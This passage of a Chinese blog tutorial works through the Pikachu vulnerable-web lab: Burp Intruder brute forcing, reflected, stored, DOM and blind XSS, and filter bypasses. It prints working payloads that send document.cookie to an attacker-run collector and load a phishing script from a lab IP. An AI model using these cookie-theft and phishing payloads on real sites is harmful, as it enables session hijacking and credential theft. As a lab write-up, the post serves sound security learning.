class="lazyload"><br>将数据包发送到Intruder，设置变量用户名和密码，验证码则输入正确的验证码，不设置变量。输入字典进行破解。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-39-20.png" alt="配置字典" class="lazyload"><br>长度排序找出正确的用户名和密码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-40-51.png" alt="查找用户名密码" class="lazyload"><br>登录成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-09-15-41-55.png" alt="登录成功" class="lazyload"></p>
<p><strong>（on-server）这种方式存在的问题：</strong></p>
<ul>
<li>验证码在后台不过期，导致可以长期被使用</li>
<li>验证码校验不严格,逻辑出现问题</li>
<li>验证码设计的太过简单和有规律,容易被猜解</li>
</ul>
<h4 id="token防暴破？"><a href="#token防暴破？" class="headerlink" title="token防暴破？"></a>token防暴破？</h4><p>Token在计算机身份认证中是令牌（临时）的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。<br>一个token实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//生成一个token，以当前的时间＋一个5位的前缀</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_token</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(isset($_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;<br>        unset($_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]);<br>        &#125;<br>        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]=str_replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,uniqid(mt_rand(<span class="hljs-number">10000</span>,<span class="hljs-number">99999</span>),<span class="hljs-literal">true</span>));<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>一般的做法：</p>
<ol>
<li>将token以”type=‘hidden’’”的形式输出在表单中</li>
<li>在提交的认证的时候一起提交，并在后台对其进行校验<br>由于其token值输出在了前端源码中,容易被获取,因此也就失去了防暴力破解的意义。一般Token在防止CSRF上会有比较好的功效，具体讲在CSRF漏洞章节进行讲解</li>
</ol>
<h4 id="暴力破解常见的防范措施"><a href="#暴力破解常见的防范措施" class="headerlink" title="暴力破解常见的防范措施"></a>暴力破解常见的防范措施</h4><ul>
<li>设计安全的验证码(安全的流程+复杂而又可用的图形)</li>
<li>对认证错误的提交进行计数并给出限制,比如连续5次密码错误,锁定2小时</li>
<li>必要的情况下，使用双因素认证</li>
</ul>
<h3 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h3><ul>
<li>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：反射型xss、存储型xss、dom型xss。</li>
<li>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</li>
<li>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</li>
<li>XSS漏洞可以用来进行钓鱼攻击、钓鱼攻击、前端js挖矿、用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制等。</li>
</ul>
<h4 id="xss-窃取cookie-攻击流程"><a href="#xss-窃取cookie-攻击流程" class="headerlink" title="xss(窃取cookie)攻击流程"></a>xss(窃取cookie)攻击流程</h4><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-13-16-47.png" alt="xss流程" class="lazyload"></p>
<h4 id="xss漏洞分类及攻击流程"><a href="#xss漏洞分类及攻击流程" class="headerlink" title="xss漏洞分类及攻击流程"></a>xss漏洞分类及攻击流程</h4><p><strong>xss分为（危害排序）：</strong> 存储型&gt;反射型&gt;dom型</p>
<ol>
<li>存储型xss：持久化代码是存储在服务器中的，如在注册账号个人信息或发表文章、留言版等地方插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</li>
<li>反射型xss：非持久化存储代码,一次性，所见所得，需要欺骗用户自己去点击链接才能出发攻击（服务器中没有这种页面和内容），一般出现在web页面（查询页面），多用来盗取cookie。</li>
<li>dom型xss：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model，DOM)的一种漏洞，DOM-XSS是通过 url 传入参数去控制触发的，也是一次性的，其实也属于反射型XSS</li>
</ol>
<p><strong>xss形成原因</strong>是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p><strong>xss的攻击载荷：</strong> script、svg、img、body、video、style标签<br><strong>xss可以插在哪里：</strong></p>
<ol>
<li>用户输入作为 script 标签内容</li>
<li>用户输入作为 html注释内容、标签的属性名和属性值、标签的名字（关键是要闭合标签）</li>
<li>直接插入到css中</li>
<li>最重要的是，千万不要引入任何不可信的第三方 JavaScript 到页面里！</li>
</ol>
<p><strong>xss的攻击流程：</strong></p>
<ol>
<li>在目标网站找到输入点如搜索框留言板等</li>
<li>输入一组”特殊字符+唯一识别字符”, 点击提交后,查看返回的源码，是否有做对应的处理</li>
<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件 (构造闭合)</li>
<li>提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞</li>
</ol>
<p>接口处一般为反射型，留言评论处一般为存储型，由于后台存在过滤构造的script可能过滤掉不生效，或者浏览器限制执行，尽量构造script绕过后台过滤。</p>
<h4 id="反射性xss（get-amp-post）学习"><a href="#反射性xss（get-amp-post）学习" class="headerlink" title="反射性xss（get&amp;post）学习"></a>反射性xss（get&amp;post）学习</h4><p>打开对应的靶场，在输入点输入特定的字符串如*;”‘&gt;&lt;666*，目的是为了查看是否会对输入的字符串进行过滤、输出、处理。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-29-09.png" alt="测试是否处理" class="lazyload"><br>查看源码我们发现并没有对字符串处理直接原样输出：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-32-04.png" alt="源码" class="lazyload"><br>我们输入正确的javascript代码看是否会原样输出：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-40-21.png" alt="输入" class="lazyload"><br>还没输入完但是输入不了了，原因是对长度进行了限制。这是在前端的安全设置，意义不是很大。兵来将挡水来土掩，在设置中打开web开发者工具，查找输入框语句，修改并扩大输入框限制，并继续输入代码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-38-13.png" alt="扩大限制" class="lazyload"><br>输入代码：<code>&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;</code>然后点击提交，我们可以看到输入的代码执行了并且出现了xss弹窗。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-42-23.png" alt="代码执行" class="lazyload"><br>因为是反射性，一次性的，刷新页面之后弹窗消失。这个xss实际上是以get的方式提交的。<br><strong>get和post</strong> 提交方式的区别为get实在url中作为参数提交，在url中可以看到，而post提交是以表单的方式提交在url中看不到。GET方式的XSS漏洞更加容易被利用, 一般利用的方式是将带有跨站脚本的URL伪装后发送给目标，而POST方式由于是以表单方式提交,无法直接使用URL方式进行攻击。<br>post方式的靶场和get方式差不多，只不过我们需要先登录才能看到靶场测是的输入点，以post方式在url中看不到提交的参数，我们可通过hackbr查看post方式的参数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-03-40.png" alt="post的反射性xss" class="lazyload"></p>
<h4 id="存储型xss学习"><a href="#存储型xss学习" class="headerlink" title="存储型xss学习"></a>存储型xss学习</h4><p>存储型xss与反射型xss形成的原因不同，存储型xss将攻击者的脚本注入到后台数据库中永久化存储，构成更加持久的威胁也被称为永久型xss。<br>打开存储型的靶场我们在留言板上试着留言666如图所示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-18-02.png" alt="留言" class="lazyload"><br>可以看到在mysql数据库的pikachu的message表中有相关信息，实现了永久化存储<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-19-25.png" alt="数据库信息" class="lazyload"><br>再次输入一条信息还能显示，确实存储在了后台数据库中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-20-38.png" alt="第二次输入信息" class="lazyload"><br>按照先前的思路，我们先测试这个留言版中是否存在xss，先输入特殊字符<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-23-41.png" alt="特殊字符" class="lazyload"><br>查看源码并未做特殊处理直接输出<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-25-32.png" alt="源码" class="lazyload"><br>我们输入一个payload，一个弹窗，提交后我们发现出现了弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-30-43.png" alt="测试" class="lazyload"><br>我们刷新页面发现弹窗仍然存在在后台数据库中也能看到相关payload<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-34-24.png" alt="永久化" class="lazyload"><br>与反射型手法差不多，唯一区别就是永久性和一次性</p>
<h4 id="dom型Xss学习"><a href="#dom型Xss学习" class="headerlink" title="dom型Xss学习"></a>dom型Xss学习</h4><p>DOM：通过html Dom和JavaScript可以访问和改变html文档的所有元素，文档对象模型即dom，在浏览器加载网页时会创建这个对象<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-56-44.png" alt="dom" class="lazyload"><br>通过JavaScript可以重构整个html，JavaScript要通过dom这个对象来选择html中的元素来进行修改，可以把dom想象成一个接口。<br>打开dom型xss我们来进行学习：<br>我们在输入框中输入一串字符，点击查看效果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-07-54.png" alt="输入字符" class="lazyload"><br>显示what do you see？可以打开源码查看做了什么<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-14-13.png" alt="源码" class="lazyload"><br>可以看到输入框中输入的能容拼接入一个a标签，判断此处是否有xss漏洞，与之前思路一样。先确认输入点，输入就是input也就是输入框。输出的话DOM是纯前端操作，输出也是前端输出。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-18-27.png" alt="代码" class="lazyload"><br>红框选中的str即为我们在文本框中输入的字符串，将这句拼接的话拿出来单独分析,利用输入构造一个闭合</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们依旧构造一个弹窗在输入框中输入：<code>#&#39; onclick=&quot;alert(&#39;a&#39;)&quot;&gt;</code><br>构成a标签闭合且加了一个弹窗：<code>&lt;a href=&#39;#&#39; onclick=&quot;alert(&#39;a&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code><br>点击一下a标签会出现弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-29-39.png" alt="测试" class="lazyload"><br>有点小瑕疵但可以执行。</p>
<h4 id="dom型xss-x学习"><a href="#dom型xss-x学习" class="headerlink" title="dom型xss-x学习"></a>dom型xss-x学习</h4><p>这是一个例外，在输入框输入字符串并提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-34-10.png" alt="输入" class="lazyload"><br>同样查看源码，看看是什么操作，<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-12-22.png" alt="代码" class="lazyload"><br>这个的输入实际上是从url中获取的，类似与反射型，我们依旧对a标签进行闭合输入<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-16-06.png" alt="出现弹窗" class="lazyload"><br>点击提交产生了弹窗</p>
<h4 id="xss盲打和原理分析"><a href="#xss盲打和原理分析" class="headerlink" title="xss盲打和原理分析"></a>xss盲打和原理分析</h4><p>xss盲打指的是一种攻击场景，就是从前端输入的数据只能在后台看到前端页面不会展示，从前端无法判断是否存在xss。操作方法不管前端页面分返回直接往输入点插xss代码然后等待看看是否可以撞大运获取到信息。由于是后台管理页面，安全考虑不严格登录的时候就会被x。<br>打开xss盲打进行学习：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-45-29.png" alt="盲打" class="lazyload"><br>我们在前端输入了xss代码<code>&lt;script&gt;alert(&#39;xni&#39;)&lt;/script&gt;</code>,点击了提交，在前端页面并没有显示，也就是说只能在后台管理页面才可以看到。我们使用管理员账号密码登录后台管理页面看看我们输入的弹窗代码是否会执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-52-10.png" alt="后台登录" class="lazyload"><br>输入用户名密码点击登录查看是否有弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-54-17.png" alt="出现弹窗" class="lazyload"><br>管理员被x到，这种情况就是xss盲打，对攻击者来说只是尝试的输入，并不知道后台是否被输出，只是尝试的输入跨站脚本。管理员被x到，攻击者成功。这种危害比较大，如果在前端输入一段盗取cookie的脚本，管理员一登陆，管理员的cookie就会被获取。攻击者就可以伪装管理员登陆后台，后台的权限就大了。</p>
<h4 id="xss的绕过和过滤（filter-amp-htmlspecialchars）"><a href="#xss的绕过和过滤（filter-amp-htmlspecialchars）" class="headerlink" title="xss的绕过和过滤（filter&amp;htmlspecialchars）"></a>xss的绕过和过滤（filter&amp;htmlspecialchars）</h4><p><strong>xss绕过-过滤-转换</strong></p>
<ul>
<li>前端限制绕过，直接抓包重放，或者修改前端html代码</li>
<li>大小写，如:  <code>&lt;SCRIPT&gt; aLeRT(111)&lt;/sCRIpt&gt;</code></li>
<li>拼凑：<code>&lt;scri&lt;script&gt; pt&gt; alert(111)&lt;/scri&lt;/script&gt; pt&gt;</code></li>
<li>使用注释进行干扰:<code>&lt;scri&lt;!--....--&gt; pt&gt; alert(111)&lt;/sc &lt;--test--&gt; ript&gt;</code></li>
<li><em>xss绕过-过滤-编码</em>*<br>核心思路：后台过滤了特殊字符比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后端不一定会过滤，当浏览器对改编码进行识别时会正常翻译从而执行，在使用编码时需注意编码在输出点是否会被正常识别和翻译<br>例子：<code>&lt; img src=x onerror=”alert( xss )&quot;</code>将alert( xss )进行url编码可以执行吗？</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=x onerror= <span class="hljs-string">&quot; alert%28%27xss%27%29&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

<p>不可以，因为标签属性不会正常解析这些编码<br>例子：使用事件属性onxx();</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=x onerror=<span class="hljs-string">&quot; alert(&#x27;xss&#x27;)&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

<p>可以把alert(“xss )进行html编码,可以执行.事件标签里面并不会执行标签里面的代码。<br><strong>XSS绕过的姿势有很多取决于你的思路和对前端技术的掌握程度</strong><br>打开xss之过滤我们随意输入字符串：<code>&lt;script&gt;;&#39;#@</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-37-26.png" alt="xss过滤" class="lazyload"><br>查看源码发现我们输入的字符串中scrpit标签被过滤了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-39-20.png" alt="源码" class="lazyload"><br>尝试大小写绕过<code>&lt;scRIPt&gt;alert(666)&lt;/ScrIpt&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-41-18.png" alt="成功" class="lazyload"><br>成功弹窗，也可以换别的标签<code>&lt;img src=x onerror=&quot;alert(666)&quot;&gt;</code>绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-42-55.png" alt="弹窗" class="lazyload"><br>成功弹窗<br><strong>XSS绕过关于htmlspecialchars()函数</strong><br>htmlspecialchars()函数把预定义的字符转换为HTML实体,预定义的字符是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&amp;(和号)成为&amp;<br>“(双引号)成为”<br>‘(单引号)成为’<br>&lt;(小于)成为&lt;<br>‘&gt;’(大于)成为&gt;<br></code></pre></td></tr></table></figure>

<p>可用的引号类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">ENT_ COMPAT -默认。仅编码双引号。<br>ENT QUOTES -编码双引号和单引号。<br>ENT NOQUOTES -不编码任何引号。<br></code></pre></td></tr></table></figure>

<p>打开xss之htmlspecialchars输入字符串66666’“&lt;&gt;#$%查看返回页面信息和源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-52-26.png" alt="输入字符串" class="lazyload"><br>提交后查看页面源码<br><code>&lt;a href=&quot;66666’“&lt;&gt;#$%&quot;&gt;66666’“&amp;lt;&amp;gt;#$%&lt;/a&gt;</code><br>可以发现除了单引号其他特殊字符都进行了特殊编码，可以构造<code>q&#39; onclick=&#39;alert(666)&#39;</code>对前边的单引号闭合，点击提交然后点击记录出现弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-11-01.png" alt="弹窗" class="lazyload"></p>
<p><strong>XSS输出在href和js中的案例分析</strong><br>打开xss之herf，输入Javascript:alert(666)，不含有特殊字符<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-13-18.png" alt="测试" class="lazyload"><br>打开源码查看</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;Javascript:alert(666)&quot;</span>&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在a标签的herf中，我们返回页面点击返回的蓝色字体<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-16-07.png" alt="点击蓝字" class="lazyload"><br>alert被执行，出现弹窗。在这里我们可以做出相应防范，只允许http,https，其次在进行htmlspecialchars处理。<br>打开xss之js，我们随意输入然后查看页内原码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-19-20.png" alt="源码" class="lazyload"><br>我们输入tmac<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-22-31.png" alt="tmac" class="lazyload"><br>我们尝试造成闭合输入<code>x&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>先将前面的script闭合再插入我们自己的语句<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-24-29.png" alt="造成闭合" class="lazyload"><br>出现弹窗，查看代码可以看到确实闭合了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-26-17.png" alt="代码闭合" class="lazyload"></p>
<h4 id="xss危害：获取cookie的原理和危害"><a href="#xss危害：获取cookie的原理和危害" class="headerlink" title="xss危害：获取cookie的原理和危害"></a>xss危害：获取cookie的原理和危害</h4><p>get型xss的利用（将恶意代码装到url中发送给用户用户访问后盗取信息）：<br>首先我们需要打开皮卡丘靶场的xss后台进行登录查看收集的数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-17-52-58.png" alt="xss后台" class="lazyload"><br>可以看到cookie数据为空<br>然后打开反射型xss的get型，首先我们先解决字符长度，然后我们写入一个比较复杂的payload，目的是获取本地cookie发送给xss后台</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">payload为：&lt;script&gt;<span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;http://xss平台的ip/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> +<span class="hljs-built_in">document</span>.cookie;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>这里的payload需要自己修改一下这个文件文件，这里是在虚拟机里边搭建的，都改成虚拟机的IP地址即可，这里需要注意文件路径<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-36-24.png" alt="文件修改" class="lazyload"><br>配置好后将payload输入靶场进行演示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-43-43.png" alt="步骤" class="lazyload"></p>
<p>post型xss利用：<br>输入账号密码登录，页面跳转，输入字符，不难发现并没有在url中提交参数。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-55-48.png" alt="参数" class="lazyload"><br>可以打开hackbar来查看提交的参数使用message来传递的<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-57-18.png" alt="post参数" class="lazyload"><br>message是通过请求体返回，通过post方式传到后台。这样的话是不能把恶意代码嵌入url中。<br>POST型XSS获取cookie原理（将伪造的页面链接发送给用户）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-01-00.png" alt="post型原理" class="lazyload"><br>需要自己搭一个恶意站点，然后在网站上放一个post表单，将存放POST表单的链接发送给受害者，诱导受害者点击。 这个POST表单会自动向漏洞服务器提交一个POST请求，实现受害者帮我们提交POST请求的目的。我们只需要诱导受害者点击上面的链接就能窃取用户的Cookie。<br>post型演示：<br>演示之前首先要修改这个文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-34-53.png" alt="修改" class="lazyload"><br>演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-55-13.png" alt="演示" class="lazyload"><br>可以看到成功获取到cookie</p>
<h4 id="xss危害-XSS进行钓鱼的原理和演示"><a href="#xss危害-XSS进行钓鱼的原理和演示" class="headerlink" title="xss危害-XSS进行钓鱼的原理和演示"></a>xss危害-XSS进行钓鱼的原理和演示</h4><p>钓鱼的思路（存储型xss，存储到服务器然后用户输）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-04-12.png" alt="思路" class="lazyload"><br>攻击者制作一个钓鱼登录页面，人后通过存储型xss漏洞将页面展示到网站中，用户防护意识不强的话将账号密码填入发送，钓鱼成功<br>演示：<br>首先需要修改文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-10-06.png" alt="修改文件" class="lazyload"><br>演示打开钓鱼后台，打开存储型xss，输入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;http://192.168.23.128/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>(这里的src中的网址问xss平台的网址)页面会出现弹窗，输入账号密码。当页面刷新时依然存在弹窗，所有访问者都会遇到弹窗，输入账号密码后，数据被存入后台，打开xss后台即可查看钓鱼数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-17-18.png" alt="演示" class="lazyload"></p>
<h4 id="XSS危害XSS获取键盘记录原理和演示"><a href="#XSS危害XSS获取键盘记录原理和演示" class="headerlink" title="XSS危害XSS获取键盘记录原理和演示"></a>XSS危害XSS获取键盘记录原理和演示</h4><p>首先要理解跨域<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-38-00.png" alt="跨域" class="lazyload"><br>当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。<br><strong>跨域同源策略</strong> 为了安全考虑，所有的浏览器都约定了<strong>同源策略</strong>， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。如果想要跨域操作,则需要管理员进行特殊的配置。比如通过: header( “Access -Control Allow- Origin:x.com” )指定。<br>Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。<br><img data-fancybox="gallery" data-sizes="auto" 